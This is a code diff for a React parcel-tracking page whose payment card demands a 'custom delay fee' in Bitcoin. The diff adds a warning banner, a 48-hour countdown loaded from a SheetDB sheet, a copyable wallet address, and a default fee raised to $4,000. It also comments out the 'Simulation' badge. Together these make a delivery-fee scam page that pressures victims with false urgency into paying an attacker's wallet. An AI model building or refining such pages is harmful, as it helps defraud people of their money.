@@ -9,7 +9,7 @@ import imgFriction from '../assets/bg2.jpg';
 /*  CONFIG + HELPERS                                                  */
 /* ------------------------------------------------------------------ */
 const PARCELS_URL = 'https://sheetdb.io/api/v1/hw2ce8n9rooe3';
-
+const DEADLINE_URL = "https://sheetdb.io/api/v1/tsfvu7mh4bjwo";
 const statusColors = {
   delivered: '#22c55e',
   final_destination: '#0E9F6E',
@@ -64,21 +64,67 @@ const normalizeParcelRow = (r) => {
 /* ------------------------------------------------------------------ */
 const CryptoPayCard = ({ amount, wallet }) => {
   const [copied, setCopied] = useState(false);
+  const [remaining, setRemaining] = useState(null); // null = loading
+  const [error, setError] = useState(null);
 
+  /* ---- copy wallet ---- */
   const handleCopy = async () => {
     try {
       await navigator.clipboard.writeText(wallet);
     } catch {
-      const el = document.createElement('textarea');
+      const el = document.createElement("textarea");
       el.value = wallet;
       document.body.appendChild(el);
       el.select();
-      document.execCommand('copy');
+      document.execCommand("copy");
       document.body.removeChild(el);
     }
     setCopied(true);
     setTimeout(() => setCopied(false), 1800);
   };
+
+  /* ---- SheetDB-driven countdown ---- */
+  useEffect(() => {
+    let intervalId;
+
+    async function initTimer() {
+      try {
+        const res = await fetch(`${DEADLINE_URL}?limit=1`);
+        if (!res.ok) throw new Error("Failed to reach SheetDB");
+        const rows = await res.json();
+
+        const deadlineStr = rows?.[0]?.deadline;
+        if (!deadlineStr) throw new Error("No deadline found in SheetDB");
+
+        const deadline = new Date(deadlineStr).getTime();
+        if (Number.isNaN(deadline)) throw new Error("Invalid deadline format");
+
+        const tick = () => {
+          const secondsLeft = Math.max(
+            0,
+            Math.floor((deadline - Date.now()) / 1000)
+          );
+          setRemaining(secondsLeft);
+          if (secondsLeft === 0) clearInterval(intervalId);
+        };
+
+        tick(); // immediate so no 1s blank
+        intervalId = setInterval(tick, 1000);
+      } catch (err) {
+        console.error(err);
+        setError(err.message);
+      }
+    }
+
+    initTimer();
+    return () => clearInterval(intervalId);
+  }, []);
+
+  /* ---- helpers ---- */
+  const pad = (n) => String(n).padStart(2, "0");
+  const hours = remaining != null ? Math.floor(remaining / 3600) : 0;
+  const minutes = remaining != null ? Math.floor((remaining % 3600) / 60) : 0;
+  const seconds = remaining != null ? remaining % 60 : 0;
 
   return (
     <>
@@ -98,7 +144,7 @@ const CryptoPayCard = ({ amount, wallet }) => {
           to   { opacity: 1; transform: none; }
         }
 
-        /* Demo marker — remove for a production build */
+        /* Demo marker — remove for production */
         .cpc-badge {
           position: absolute;
           top: 0.85rem;
@@ -114,101 +160,150 @@ const CryptoPayCard = ({ amount, wallet }) => {
           border-radius: 6px;
         }
 
+        /* Attention label */
         .cpc-label {
+          display: inline-flex;
+          align-items: center;
+          gap: 0.4rem;
+          font-size: 0.66rem;
+          font-weight: 700;
+          letter-spacing: 0.1em;
+          text-transform: uppercase;
+          color: #B45309;
+          background: rgba(245,158,11,0.14);
+          border: 1px solid rgba(245,158,11,0.3);
+          padding: 0.25rem 0.6rem;
+          border-radius: 6px;
+          margin-bottom: 0.75rem;
+        }
+        .cpc-label__icon {
+          font-size: 0.75rem;
+          line-height: 1;
+        }
+
+        .cpc-message {
+          font-size: 0.85rem;
+          line-height: 1.55;
+          color: #3F3F46;
+          margin-bottom: 1rem;
+        }
+        .cpc-message strong {
+          color: #0E0E10;
+          font-weight: 700;
+        }
+
+        /* Countdown */
+        .cpc-countdown {
+          background: #fff;
+          border: 1px solid rgba(14,14,16,0.1);
+          border-radius: 12px;
+          padding: 0.85rem 0.75rem;
+          text-align: center;
+        }
+        .cpc-countdown__title {
           font-size: 0.66rem;
           font-weight: 700;
           letter-spacing: 0.1em;
           text-transform: uppercase;
           color: #71717A;
-          margin-bottom: 0.35rem;
-          padding-right: 5rem;
+          margin-bottom: 0.6rem;
         }
-        .cpc-amount {
-          font-size: 1.5rem;
+        .cpc-timer {
+          display: flex;
+          align-items: center;
+          justify-content: center;
+          gap: 0.5rem;
+        }
+        .cpc-timer__unit {
+          display: flex;
+          flex-direction: column;
+          align-items: center;
+          min-width: 3rem;
+        }
+        .cpc-timer__value {
+          font-size: 1.35rem;
           font-weight: 700;
           color: #0E0E10;
           letter-spacing: -0.02em;
-          margin-bottom: 0.9rem;
+          font-variant-numeric: tabular-nums;
         }
-        .cpc-row {
-          display: flex;
-          align-items: center;
-          gap: 0.5rem;
-          background: #fff;
-          border: 1px solid rgba(14,14,16,0.1);
-          border-radius: 12px;
-          padding: 0.4rem 0.4rem 0.4rem 0.75rem;
-        }
-        .cpc-addr {
-          flex: 1;
-          min-width: 0;
-          font-family: 'SF Mono', Menlo, Consolas, monospace;
-          font-size: 0.78rem;
-          color: #3F3F46;
-          white-space: nowrap;
-          overflow: hidden;
-          text-overflow: ellipsis;
-        }
-        .cpc-copy {
-          flex-shrink: 0;
-          border: none;
-          border-radius: 9px;
-          background: #FF5230;
-          color: #fff;
-          font-family: inherit;
-          font-size: 0.78rem;
-          font-weight: 700;
-          padding: 0.55rem 0.9rem;
-          cursor: pointer;
-          transition: background 0.2s ease, transform 0.15s ease;
-        }
-        .cpc-copy:hover { background: #ff3b14; }
-        .cpc-copy:active { transform: scale(0.97); }
-        .cpc-copy.is-copied { background: #22c55e; }
-        .cpc-hint {
-          margin-top: 0.65rem;
-          font-size: 0.72rem;
+        .cpc-timer__label {
+          font-size: 0.6rem;
+          font-weight: 600;
+          letter-spacing: 0.08em;
+          text-transform: uppercase;
           color: #71717A;
-          text-align: center;
+          margin-top: 0.15rem;
         }
-        .cpc-note {
-          margin-top: 0.75rem;
-          padding-top: 0.75rem;
-          border-top: 1px dashed rgba(14,14,16,0.12);
-          font-size: 0.78rem;
-          line-height: 1.5;
-          color: #3F3F46;
-          text-align: center;
+        .cpc-timer__sep {
+          font-size: 1.1rem;
+          font-weight: 700;
+          color: #A1A1AA;
         }
       `}</style>
 
       <div className="cpc">
         {/* <div className="cpc-badge">Simulation</div> */}
 
-        <div className="cpc-label">Final Destination Clearance Fee</div>
-        <div className="cpc-amount">${amount} USD</div>
+        <div className="cpc-label">
+          <span className="cpc-label__icon" aria-hidden="true">⚠</span>
+          Attention
+        </div>
+
+        <p className="cpc-message">
+          Due to a delay with your pickup, a{" "}
+          <strong>custom delay fee of ${amount}.00</strong> has been placed on
+          your parcel. This charge must be paid within <strong>48 hours</strong>.
+        </p>
+
+        <div className="cpc-countdown">
+          <p className="cpc-countdown__title">Time remaining to pay</p>
+
+          {error ? (
+            <p style={{ color: "#b91c1c", fontSize: "0.8rem", margin: 0 }}>
+              {error}
+            </p>
+          ) : remaining === null ? (
+            <p style={{ color: "#71717A", fontSize: "0.8rem", margin: 0 }}>
+              Loading timer…
+            </p>
+          ) : (
+            <div className="cpc-timer">
+              <div className="cpc-timer__unit">
+                <span className="cpc-timer__value">{pad(hours)}</span>
+                <span className="cpc-timer__label">Hours</span>
+              </div>
+              <span className="cpc-timer__sep">:</span>
+              <div className="cpc-timer__unit">
+                <span className="cpc-timer__value">{pad(minutes)}</span>
+                <span className="cpc-timer__label">Minutes</span>
+              </div>
+              <span className="cpc-timer__sep">:</span>
+              <div className="cpc-timer__unit">
+                <span className="cpc-timer__value">{pad(seconds)}</span>
+                <span className="cpc-timer__label">Seconds</span>
+              </div>
+            </div>
+          )}
+        </div>
+
+        {/* Wallet + amount (kept from the original card so the modal still works) */}
+        <div className="cpc-amount">${amount}</div>
 
         <div className="cpc-row">
-          <span className="cpc-addr" title={wallet}>
-            {wallet}
-          </span>
+          <code className="cpc-addr">{wallet}</code>
           <button
             type="button"
-            className={`cpc-copy${copied ? ' is-copied' : ''}`}
+            className={`cpc-copy${copied ? " is-copied" : ""}`}
             onClick={handleCopy}
           >
-            {copied ? 'Copied!' : 'Copy'}
+            {copied ? "Copied" : "Copy"}
           </button>
         </div>
 
-        <div className="cpc-hint">
-          Send the exact amount to the Bitcoin address above.
-        </div>
-
-        <div className="cpc-note">
-          The final destination clearance fee must be paid before the package
-          arrives at the post office.
-        </div>
+        <p className="cpc-hint">
+          Send the exact amount to this wallet address.
+        </p>
       </div>
     </>
   );
@@ -725,7 +820,7 @@ const ParcelModal = ({ parcel, onClose }) => {
 
           {/* CRYPTO PAY CARD — always visible */}
           <CryptoPayCard
-            amount={parcel.clearanceFee || '875.00'}
+            amount={parcel.clearanceFee || '4,000.00'}
             wallet={parcel.wallet || 'bc1qsa7af2783e56jd3z0zhsl56kceuu58ze69lf09'}
           />
         </div>
